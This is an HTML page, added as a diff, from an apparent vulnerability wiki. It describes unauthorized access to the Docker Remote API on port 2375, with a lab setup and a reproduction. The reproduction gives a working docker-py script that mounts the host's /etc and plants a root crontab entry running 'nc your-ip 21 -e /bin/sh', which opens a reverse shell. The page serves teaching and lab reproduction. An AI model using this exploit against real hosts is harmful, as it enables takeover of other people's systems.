@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Docker/unauthorized-rce/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Docker Remote API Unauthorized Access Leads to Remote Code Execution - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Docker Remote API Unauthorized Access Leads to Remote Code Execution", url: "#_top", children: [
+              {title: "Environment Setup", url: "#environment-setup" },
+              {title: "Vulnerability Reproduction", url: "#vulnerability-reproduction" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="README.zh-cn/" class="btn btn-xs btn-link">
+        Docker Remote API 未授权访问导致远程代码执行
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%EF%BC%88CVE-2019-14271%EF%BC%89Docker%20copy%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%EF%BC%88CVE-2019-14271%EF%BC%89Docker%20copy%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CVE-2019-14271）Docker copy漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="docker-remote-api-unauthorized-access-leads-to-remote-code-execution">Docker Remote API Unauthorized Access Leads to Remote Code Execution<a class="headerlink" href="#docker-remote-api-unauthorized-access-leads-to-remote-code-execution" title="Permanent link">&para;</a></h1>
+<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
+<p>Docker is a platform-as-a-service solution that delivers software in packages called containers. The Docker daemon (dockerd) exposes a REST API that allows remote management of Docker containers, images, and other resources.</p>
+<p>When the Docker daemon is configured to listen on a network port (typically TCP port 2375) without proper authentication mechanisms, attackers can gain unauthorized access to the Docker API. This vulnerability allows attackers to create, modify, and execute containers on the host system, potentially leading to remote code execution, data theft, and complete host system compromise.</p>
+<ul>
+<li><a href="https://docs.docker.com/engine/security/protect-access/">https://docs.docker.com/engine/security/protect-access/</a></li>
+<li><a href="https://tttang.com/archive/357/">https://tttang.com/archive/357/</a></li>
+</ul>
+<h2 id="environment-setup">Environment Setup<a class="headerlink" href="#environment-setup" title="Permanent link">&para;</a></h2>
+<p>Execute the following command to start the vulnerable Docker environment:</p>
+<div class="highlight"><pre><span></span><code>docker compose build
+docker compose up -d
+</code></pre></div>
+<p>After the environment is started, the Docker daemon will listen on port 2375 without any authentication requirements.</p>
+<h2 id="vulnerability-reproduction">Vulnerability Reproduction<a class="headerlink" href="#vulnerability-reproduction" title="Permanent link">&para;</a></h2>
+<p>The vulnerability can be exploited using Python with the docker-py library. The attack involves creating a new container that mounts the host's /etc directory, allowing an attacker to modify critical system files. In this example, we will demonstrate the vulnerability by adding a malicious crontab entry that creates a reverse shell.</p>
+<p>First, install the required Python library:</p>
+<div class="highlight"><pre><span></span><code>pip install docker
+</code></pre></div>
+<p>Then create and run a Python script that exploits the vulnerability:</p>
+<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">docker</span>
+
+<span class="n">client</span> <span class="o">=</span> <span class="n">docker</span><span class="o">.</span><span class="n">DockerClient</span><span class="p">(</span><span class="n">base_url</span><span class="o">=</span><span class="s1">&#39;http://your-ip:2375/&#39;</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">containers</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s1">&#39;alpine:latest&#39;</span><span class="p">,</span> <span class="sa">r</span><span class="s1">&#39;&#39;&#39;sh -c &quot;echo &#39;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&#39; &gt;&gt; /tmp/etc/crontabs/root&quot; &#39;&#39;&#39;</span><span class="p">,</span> <span class="n">remove</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">volumes</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;/etc&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;bind&#39;</span><span class="p">:</span> <span class="s1">&#39;/tmp/etc&#39;</span><span class="p">,</span> <span class="s1">&#39;mode&#39;</span><span class="p">:</span> <span class="s1">&#39;rw&#39;</span><span class="p">}})</span>
+</code></pre></div>
+<p>The script creates a container that mounts the host's /etc directory and adds a reverse shell command to the root user's crontab. Within a minute, the cron daemon will execute the command, establishing a reverse shell connection to the attacker's machine.</p>
+<p>The successful exploitation can be verified by receiving the reverse shell connection:</p>
+<p><img alt="Reverse Shell Exploitation" src="1.png" /></p>
+<p>This vulnerability demonstrates the critical importance of properly securing Docker daemon access and implementing authentication mechanisms for remote API endpoints.</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="README.zh-cn/" class="btn btn-xs btn-link">
+        Docker Remote API 未授权访问导致远程代码执行
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%EF%BC%88CVE-2019-14271%EF%BC%89Docker%20copy%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%EF%BC%88CVE-2019-14271%EF%BC%89Docker%20copy%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CVE-2019-14271）Docker copy漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
